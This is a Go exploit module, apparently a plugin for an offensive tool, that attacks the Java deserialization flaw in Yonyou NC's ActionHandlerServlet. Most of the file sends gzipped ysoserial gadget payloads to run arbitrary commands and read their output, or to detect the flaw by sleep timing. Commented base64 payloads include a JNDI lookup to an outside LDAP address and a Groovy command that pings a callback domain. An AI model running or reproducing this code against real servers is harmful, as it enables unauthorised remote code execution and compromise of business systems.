package yonyouNC

import (
	"bytes"
	"compress/gzip"
	"fmt"
	"github.com/lz520520/railgunlib/pkg/gadgets"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"github.com/lz520520/railgunlib/pkg/utils/lznet/lzhttp"
	"time"
)

type Exp_ActionHandlerServlet struct {
	exp_templates.ExpTemplate
}

func (self *Exp_ActionHandlerServlet) Attack_cmd1() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 添加参数
	self.AddEncodeCmdHeader(headers, self.MustGetStringParam("cmd"))

	// 构造payload
	payload := gadgets.YsoserialPayloadGenerator("CommonCollections6DefiningClassLoaderTomcatEcho", self.MustGetStringParam("cmd"))
	var dstBuffer bytes.Buffer
	gz := gzip.NewWriter(&dstBuffer)
	gz.Write(payload)
	gz.Flush()
	gz.Close()

	target := goutils.AppendUri(self.Params.BaseParam.Target, "/servlet/~pubapp/com.ufida.zior.console.ActionHandlerServlet")

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(target, dstBuffer.String(), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	// 解析结果
	expResult.RawResult = httpresp.RawFullResp
	if httpresp.Resp.Header.Get("Transfer-encoded") == "chunked" {
		self.EchoSuccessMsg("vul is  exists.")
		result, err := self.ParserEncodeCmdResult(httpresp.Body)
		if err != nil {
			expResult.Err = err.Error()
		} else {
			expResult.Result = result
		}

	} else {
		self.EchoErrMsg(httpresp.Body)
	}
	return
}

func (self *Exp_ActionHandlerServlet) Attack_getmsg1() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 添加参数
	headers.Add("Accept-Encoded", "echo")

	// 构造payload
	payload := gadgets.YsoserialPayloadGenerator("CommonCollections6DefiningClassLoaderTomcatEcho", self.MustGetStringParam("cmd"))
	var dstBuffer bytes.Buffer
	gz := gzip.NewWriter(&dstBuffer)
	gz.Write(payload)
	gz.Flush()
	gz.Close()

	target := goutils.SafeAddUri(self.Params.BaseParam.Target, "/servlet/~pubapp/com.ufida.zior.console.ActionHandlerServlet", "")

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(target, dstBuffer.String(), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	// 解析结果
	expResult.RawResult = httpresp.RawFullResp
	if httpresp.Resp.Header.Get("Transfer-encoded") == "chunked" {
		self.EchoSuccessMsg("vul is  exists.")
		result, err := self.ParserEncodeCmdResult(httpresp.Body)
		if err != nil {
			expResult.Err = err.Error()
		} else {
			expResult.Result = result
		}

	} else {
		self.EchoErrMsg(httpresp.Body)
	}
	return
}

func (self *Exp_ActionHandlerServlet) subSleep() (err error) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	payload := gadgets.YsoserialPayloadGenerator(self.MustGetStringParam("gadget"), "")
	//payload, _ = base64.StdEncoding.DecodeString("rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEGRhdGFiYXNlTWV0YURhdGF3BAAAAANzcgAdY29tLnN1bi5yb3dzZXQuSmRiY1Jvd1NldEltcGzOJtgfSXPCBQIACEwABGNvbm50ABVMamF2YS9zcWwvQ29ubmVjdGlvbjtMAA1pTWF0Y2hDb2x1bW5zdAASTGphdmEvdXRpbC9WZWN0b3I7TAAVcHJvcGVydHlDaGFuZ2VTdXBwb3J0dAAiTGphdmEvYmVhbnMvUHJvcGVydHlDaGFuZ2VTdXBwb3J0O0wAAnBzdAAcTGphdmEvc3FsL1ByZXBhcmVkU3RhdGVtZW50O0wABXJlc01EdAAcTGphdmEvc3FsL1Jlc3VsdFNldE1ldGFEYXRhO0wABnJvd3NNRHQAJUxqYXZheC9zcWwvcm93c2V0L1Jvd1NldE1ldGFEYXRhSW1wbDtMAAJyc3QAFExqYXZhL3NxbC9SZXN1bHRTZXQ7TAAPc3RyTWF0Y2hDb2x1bW5zcQB+AAt4cgAbamF2YXguc3FsLnJvd3NldC5CYXNlUm93U2V0Q9EdpU3CseACABVJAAtjb25jdXJyZW5jeVoAEGVzY2FwZVByb2Nlc3NpbmdJAAhmZXRjaERpckkACWZldGNoU2l6ZUkACWlzb2xhdGlvbkkADG1heEZpZWxkU2l6ZUkAB21heFJvd3NJAAxxdWVyeVRpbWVvdXRaAAhyZWFkT25seUkACnJvd1NldFR5cGVaAAtzaG93RGVsZXRlZEwAA1VSTHEAfgAETAALYXNjaWlTdHJlYW10ABVMamF2YS9pby9JbnB1dFN0cmVhbTtMAAxiaW5hcnlTdHJlYW1xAH4AEkwACmNoYXJTdHJlYW10ABBMamF2YS9pby9SZWFkZXI7TAAHY29tbWFuZHEAfgAETAAKZGF0YVNvdXJjZXEAfgAETAAJbGlzdGVuZXJzcQB+AAtMAANtYXB0AA9MamF2YS91dGlsL01hcDtMAAZwYXJhbXN0ABVMamF2YS91dGlsL0hhc2h0YWJsZTtMAA11bmljb2RlU3RyZWFtcQB+ABJ4cAAAA/ABAAAD6AAAAAAAAAACAAAAAAAAAAAAAAAAAQAAA+wAcHBwcHB0AB9sZGFwOi8vMTE2LjYyLjE4LjI1NToxMDk3L2FhYWFhc3IAEGphdmEudXRpbC5WZWN0b3LZl31bgDuvAQMAA0kAEWNhcGFjaXR5SW5jcmVtZW50SQAMZWxlbWVudENvdW50WwALZWxlbWVudERhdGF0ABNbTGphdmEvbGFuZy9PYmplY3Q7eHAAAAAAAAAAAHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAApwcHBwcHBwcHBweHBzcgATamF2YS51dGlsLkhhc2h0YWJsZRO7DyUhSuS4AwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAh3CAAAAAsAAAAAeHBwc3EAfgAYAAAAAAAAAAp1cQB+ABsAAAAKc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cP////9zcQB+ACH/////c3EAfgAh/////3NxAH4AIf////9zcQB+ACH/////c3EAfgAh/////3NxAH4AIf////9zcQB+ACH/////c3EAfgAh/////3NxAH4AIf////94c3IAIGphdmEuYmVhbnMuUHJvcGVydHlDaGFuZ2VTdXBwb3J0WNXSZFdIYLsDAANJACpwcm9wZXJ0eUNoYW5nZVN1cHBvcnRTZXJpYWxpemVkRGF0YVZlcnNpb25MAAhjaGlsZHJlbnEAfgAVTAAGc291cmNldAASTGphdmEvbGFuZy9PYmplY3Q7eHAAAAACcHEAfgAWcHhwcHBwc3EAfgAYAAAAAAAAAAp1cQB+ABsAAAAKcHBwcHBwcHBwcHhxAH4AFng=")
	//payload, _ = base64.StdEncoding.DecodeString("rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEGRhdGFiYXNlTWV0YURhdGF3BAAAAANzcgAdY29tLnN1bi5yb3dzZXQuSmRiY1Jvd1NldEltcGzOJtgfSXPCBQIACEwABGNvbm50ABVMamF2YS9zcWwvQ29ubmVjdGlvbjtMAA1pTWF0Y2hDb2x1bW5zdAASTGphdmEvdXRpbC9WZWN0b3I7TAAVcHJvcGVydHlDaGFuZ2VTdXBwb3J0dAAiTGphdmEvYmVhbnMvUHJvcGVydHlDaGFuZ2VTdXBwb3J0O0wAAnBzdAAcTGphdmEvc3FsL1ByZXBhcmVkU3RhdGVtZW50O0wABXJlc01EdAAcTGphdmEvc3FsL1Jlc3VsdFNldE1ldGFEYXRhO0wABnJvd3NNRHQAJUxqYXZheC9zcWwvcm93c2V0L1Jvd1NldE1ldGFEYXRhSW1wbDtMAAJyc3QAFExqYXZhL3NxbC9SZXN1bHRTZXQ7TAAPc3RyTWF0Y2hDb2x1bW5zcQB+AAt4cgAbamF2YXguc3FsLnJvd3NldC5CYXNlUm93U2V0Q9EdpU3CseACABVJAAtjb25jdXJyZW5jeVoAEGVzY2FwZVByb2Nlc3NpbmdJAAhmZXRjaERpckkACWZldGNoU2l6ZUkACWlzb2xhdGlvbkkADG1heEZpZWxkU2l6ZUkAB21heFJvd3NJAAxxdWVyeVRpbWVvdXRaAAhyZWFkT25seUkACnJvd1NldFR5cGVaAAtzaG93RGVsZXRlZEwAA1VSTHEAfgAETAALYXNjaWlTdHJlYW10ABVMamF2YS9pby9JbnB1dFN0cmVhbTtMAAxiaW5hcnlTdHJlYW1xAH4AEkwACmNoYXJTdHJlYW10ABBMamF2YS9pby9SZWFkZXI7TAAHY29tbWFuZHEAfgAETAAKZGF0YVNvdXJjZXEAfgAETAAJbGlzdGVuZXJzcQB+AAtMAANtYXB0AA9MamF2YS91dGlsL01hcDtMAAZwYXJhbXN0ABVMamF2YS91dGlsL0hhc2h0YWJsZTtMAA11bmljb2RlU3RyZWFtcQB+ABJ4cAAAA/ABAAAD6AAAAAAAAAACAAAAAAAAAAAAAAAAAQAAA+wAcHBwcHB0AB9sZGFwOi8vMTE2LjYyLjE4LjI1NToxMDk3L2FhYWFhc3IAEGphdmEudXRpbC5WZWN0b3LZl31bgDuvAQMAA0kAEWNhcGFjaXR5SW5jcmVtZW50SQAMZWxlbWVudENvdW50WwALZWxlbWVudERhdGF0ABNbTGphdmEvbGFuZy9PYmplY3Q7eHAAAAAAAAAAAHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAApwcHBwcHBwcHBweHBzcgATamF2YS51dGlsLkhhc2h0YWJsZRO7DyUhSuS4AwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAh3CAAAAAsAAAAAeHBwc3EAfgAYAAAAAAAAAAp1cQB+ABsAAAAKc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cP////9zcQB+ACH/////c3EAfgAh/////3NxAH4AIf////9zcQB+ACH/////c3EAfgAh/////3NxAH4AIf////9zcQB+ACH/////c3EAfgAh/////3NxAH4AIf////94c3IAIGphdmEuYmVhbnMuUHJvcGVydHlDaGFuZ2VTdXBwb3J0WNXSZFdIYLsDAANJACpwcm9wZXJ0eUNoYW5nZVN1cHBvcnRTZXJpYWxpemVkRGF0YVZlcnNpb25MAAhjaGlsZHJlbnEAfgAVTAAGc291cmNldAASTGphdmEvbGFuZy9PYmplY3Q7eHAAAAACcHEAfgAWcHhwcHBwc3EAfgAYAAAAAAAAAAp1cQB+ABsAAAAKcHBwcHBwcHBwcHhxAH4AFng=")
	self.EchoSuccessMsg("test")
	var dstBuffer bytes.Buffer
	gz := gzip.NewWriter(&dstBuffer)
	gz.Write(payload)
	gz.Flush()
	gz.Close()

	target := goutils.SafeAddUri(self.Params.BaseParam.Target, "/servlet/~pubapp/com.ufida.zior.console.ActionHandlerServlet", "")

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(target, dstBuffer.String(), headers)
	if httpresp.Err != nil {
		return httpresp.Err
	}

	return
}

func (self *Exp_ActionHandlerServlet) Attack_getmsg3() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	payload := gadgets.YsoserialPayloadGenerator(self.MustGetStringParam("gadget"), self.MustGetStringParam("cmd"))
	//payload, _ = base64.StdEncoding.DecodeString("rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEGRhdGFiYXNlTWV0YURhdGF3BAAAAANzcgAdY29tLnN1bi5yb3dzZXQuSmRiY1Jvd1NldEltcGzOJtgfSXPCBQIACEwABGNvbm50ABVMamF2YS9zcWwvQ29ubmVjdGlvbjtMAA1pTWF0Y2hDb2x1bW5zdAASTGphdmEvdXRpbC9WZWN0b3I7TAAVcHJvcGVydHlDaGFuZ2VTdXBwb3J0dAAiTGphdmEvYmVhbnMvUHJvcGVydHlDaGFuZ2VTdXBwb3J0O0wAAnBzdAAcTGphdmEvc3FsL1ByZXBhcmVkU3RhdGVtZW50O0wABXJlc01EdAAcTGphdmEvc3FsL1Jlc3VsdFNldE1ldGFEYXRhO0wABnJvd3NNRHQAJUxqYXZheC9zcWwvcm93c2V0L1Jvd1NldE1ldGFEYXRhSW1wbDtMAAJyc3QAFExqYXZhL3NxbC9SZXN1bHRTZXQ7TAAPc3RyTWF0Y2hDb2x1bW5zcQB+AAt4cgAbamF2YXguc3FsLnJvd3NldC5CYXNlUm93U2V0Q9EdpU3CseACABVJAAtjb25jdXJyZW5jeVoAEGVzY2FwZVByb2Nlc3NpbmdJAAhmZXRjaERpckkACWZldGNoU2l6ZUkACWlzb2xhdGlvbkkADG1heEZpZWxkU2l6ZUkAB21heFJvd3NJAAxxdWVyeVRpbWVvdXRaAAhyZWFkT25seUkACnJvd1NldFR5cGVaAAtzaG93RGVsZXRlZEwAA1VSTHEAfgAETAALYXNjaWlTdHJlYW10ABVMamF2YS9pby9JbnB1dFN0cmVhbTtMAAxiaW5hcnlTdHJlYW1xAH4AEkwACmNoYXJTdHJlYW10ABBMamF2YS9pby9SZWFkZXI7TAAHY29tbWFuZHEAfgAETAAKZGF0YVNvdXJjZXEAfgAETAAJbGlzdGVuZXJzcQB+AAtMAANtYXB0AA9MamF2YS91dGlsL01hcDtMAAZwYXJhbXN0ABVMamF2YS91dGlsL0hhc2h0YWJsZTtMAA11bmljb2RlU3RyZWFtcQB+ABJ4cAAAA/ABAAAD6AAAAAAAAAACAAAAAAAAAAAAAAAAAQAAA+wAcHBwcHB0AB9sZGFwOi8vMTE2LjYyLjE4LjI1NToxMDk3L2FhYWFhc3IAEGphdmEudXRpbC5WZWN0b3LZl31bgDuvAQMAA0kAEWNhcGFjaXR5SW5jcmVtZW50SQAMZWxlbWVudENvdW50WwALZWxlbWVudERhdGF0ABNbTGphdmEvbGFuZy9PYmplY3Q7eHAAAAAAAAAAAHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAApwcHBwcHBwcHBweHBzcgATamF2YS51dGlsLkhhc2h0YWJsZRO7DyUhSuS4AwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAh3CAAAAAsAAAAAeHBwc3EAfgAYAAAAAAAAAAp1cQB+ABsAAAAKc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cP////9zcQB+ACH/////c3EAfgAh/////3NxAH4AIf////9zcQB+ACH/////c3EAfgAh/////3NxAH4AIf////9zcQB+ACH/////c3EAfgAh/////3NxAH4AIf////94c3IAIGphdmEuYmVhbnMuUHJvcGVydHlDaGFuZ2VTdXBwb3J0WNXSZFdIYLsDAANJACpwcm9wZXJ0eUNoYW5nZVN1cHBvcnRTZXJpYWxpemVkRGF0YVZlcnNpb25MAAhjaGlsZHJlbnEAfgAVTAAGc291cmNldAASTGphdmEvbGFuZy9PYmplY3Q7eHAAAAACcHEAfgAWcHhwcHBwc3EAfgAYAAAAAAAAAAp1cQB+ABsAAAAKcHBwcHBwcHBwcHhxAH4AFng=")
	//payload, _ = base64.StdEncoding.DecodeString("rO0ABXNyAChjb20ubWNoYW5nZS52Mi5jM3AwLlBvb2xCYWNrZWREYXRhU291cmNl3iLNbMf/f6gCAAB4cgA1Y29tLm1jaGFuZ2UudjIuYzNwMC5pbXBsLkFic3RyYWN0UG9vbEJhY2tlZERhdGFTb3VyY2UAAAAAAAAAAQMAAHhyADFjb20ubWNoYW5nZS52Mi5jM3AwLmltcGwuUG9vbEJhY2tlZERhdGFTb3VyY2VCYXNlAAAAAAAAAAEDAAhJABBudW1IZWxwZXJUaHJlYWRzTAAYY29ubmVjdGlvblBvb2xEYXRhU291cmNldAAkTGphdmF4L3NxbC9Db25uZWN0aW9uUG9vbERhdGFTb3VyY2U7TAAOZGF0YVNvdXJjZU5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAApleHRlbnNpb25zdAAPTGphdmEvdXRpbC9NYXA7TAAUZmFjdG9yeUNsYXNzTG9jYXRpb25xAH4ABEwADWlkZW50aXR5VG9rZW5xAH4ABEwAA3Bjc3QAIkxqYXZhL2JlYW5zL1Byb3BlcnR5Q2hhbmdlU3VwcG9ydDtMAAN2Y3N0ACJMamF2YS9iZWFucy9WZXRvYWJsZUNoYW5nZVN1cHBvcnQ7eHB3AgABc3IAPWNvbS5tY2hhbmdlLnYyLm5hbWluZy5SZWZlcmVuY2VJbmRpcmVjdG9yJFJlZmVyZW5jZVNlcmlhbGl6ZWRiGYXQ0SrCEwIABEwAC2NvbnRleHROYW1ldAATTGphdmF4L25hbWluZy9OYW1lO0wAA2VudnQAFUxqYXZhL3V0aWwvSGFzaHRhYmxlO0wABG5hbWVxAH4ACkwACXJlZmVyZW5jZXQAGExqYXZheC9uYW1pbmcvUmVmZXJlbmNlO3hwcHBwc3IAHW9yZy5hcGFjaGUubmFtaW5nLlJlc291cmNlUmVmAAAAAAAAAAECAAB4cgAdb3JnLmFwYWNoZS5uYW1pbmcuQWJzdHJhY3RSZWYAAAAAAAAAAQIAAHhyABZqYXZheC5uYW1pbmcuUmVmZXJlbmNl6MaeoqjpjQkCAARMAAVhZGRyc3QAEkxqYXZhL3V0aWwvVmVjdG9yO0wADGNsYXNzRmFjdG9yeXEAfgAETAAUY2xhc3NGYWN0b3J5TG9jYXRpb25xAH4ABEwACWNsYXNzTmFtZXEAfgAEeHBzcgAQamF2YS51dGlsLlZlY3RvctmXfVuAO68BAwADSQARY2FwYWNpdHlJbmNyZW1lbnRJAAxlbGVtZW50Q291bnRbAAtlbGVtZW50RGF0YXQAE1tMamF2YS9sYW5nL09iamVjdDt4cAAAAAAAAAAFdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAACnNyABpqYXZheC5uYW1pbmcuU3RyaW5nUmVmQWRkcoRL9DzhEdzJAgABTAAIY29udGVudHNxAH4ABHhyABRqYXZheC5uYW1pbmcuUmVmQWRkcuugB5oCOK9KAgABTAAIYWRkclR5cGVxAH4ABHhwdAAFc2NvcGV0AABzcQB+ABh0AARhdXRocQB+ABxzcQB+ABh0AAlzaW5nbGV0b250AAR0cnVlc3EAfgAYdAALZm9yY2VTdHJpbmd0AAp4PWV2YWx1YXRlc3EAfgAYdAABeHQA5SBpZiAoU3lzdGVtLnByb3BlcnRpZXNbJ29zLm5hbWUnXS50b0xvd2VyQ2FzZSgpLmNvbnRhaW5zKCd3aW5kb3dzJykpIHsKICAgICAgIFsnY21kJywnL0MnLCAncGluZyBzcHJpbmcueDU5c25yLmFpLmhhaWJhcmEuY3lvdSddLmV4ZWN1dGUoKTsKICAgfSBlbHNlIHsKICAgICAgIFsnL2Jpbi9zaCcsJy1jJywgJ3Bpbmcgc3ByaW5nLng1OXNuci5haS5oYWliYXJhLmN5b3UnXS5leGVjdXRlKCk7CiAgIH1wcHBwcHh0ACVvcmcuYXBhY2hlLm5hbWluZy5mYWN0b3J5LkJlYW5GYWN0b3J5cHQAF2dyb292eS5sYW5nLkdyb292eVNoZWxscHBwcHcEAAAAAHh3AgABeA==")
	self.EchoSuccessMsg("test")
	var dstBuffer bytes.Buffer
	gz := gzip.NewWriter(&dstBuffer)
	gz.Write(payload)
	gz.Flush()
	gz.Close()

	target := goutils.SafeAddUri(self.Params.BaseParam.Target, "/servlet/~pubapp/com.ufida.zior.console.ActionHandlerServlet", "")

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(target, dstBuffer.String(), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	return
}

func (self *Exp_ActionHandlerServlet) Attack_cmd2() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	payload := gadgets.YsoserialPayloadGenerator("CommonsCollections6", self.MustGetStringParam("cmd"))
	var dstBuffer bytes.Buffer
	gz := gzip.NewWriter(&dstBuffer)
	gz.Write(payload)
	gz.Flush()
	gz.Close()

	target := goutils.SafeAddUri(self.Params.BaseParam.Target, "/servlet/~pubapp/com.ufida.zior.console.ActionHandlerServlet", "")

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(target, dstBuffer.String(), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.RawResult = httpresp.RawFullResp
	self.EchoSuccessMsg("无回显，自行检查漏洞")
	return
}

func (self *Exp_ActionHandlerServlet) Attack_getmsg2() (expResult exp_model.ExpResult) {

	// 默认配置
	headers := self.GetInitExpHeaders()
	// 添加参数
	target := goutils.SafeAddUri(self.Params.BaseParam.Target, "/servlet/~pubapp/com.ufida.zior.console.ActionHandlerServlet", "")

	start := time.Now()
	httpresp := lzhttp.HttpResp{}

	for i := 0; i < 3; i++ {
		httpresp = self.HttpGetWithoutRedirect(target, headers)
		if httpresp.Err != nil {
			expResult.Err = httpresp.Err.Error()
			return
		}
	}
	perInternal := time.Now().Sub(start) / 3
	self.EchoSuccessMsg(fmt.Sprintf("平均响应时间: %v", perInternal))
	// 构造payload

	payload := gadgets.YsoserialPayloadGenerator("CommonCollections6Sleep", "")

	var dstBuffer bytes.Buffer
	gz := gzip.NewWriter(&dstBuffer)
	gz.Write(payload)
	gz.Flush()
	gz.Close()

	// 发送请求
	self.Params.Settings.Timeout += 10000
	start = time.Now()
	httpresp = self.HttpPostWithoutRedirect(target, dstBuffer.String(), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	postRespTime := time.Now().Sub(start)
	self.EchoSuccessMsg(fmt.Sprintf("sleep响应时间: %v", postRespTime))
	sleepTime := postRespTime.Milliseconds() - perInternal.Milliseconds()
	if sleepTime > 8000 && sleepTime < 12000 {
		self.EchoSuccessMsg("漏洞存在")
		self.EchoSuccessMsg("URL: " + target)
	} else {
		self.EchoErrMsg("漏洞不存在")

	}

	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_ActionHandlerServlet{}, "exp_ActionHandlerServlet.yml")
}
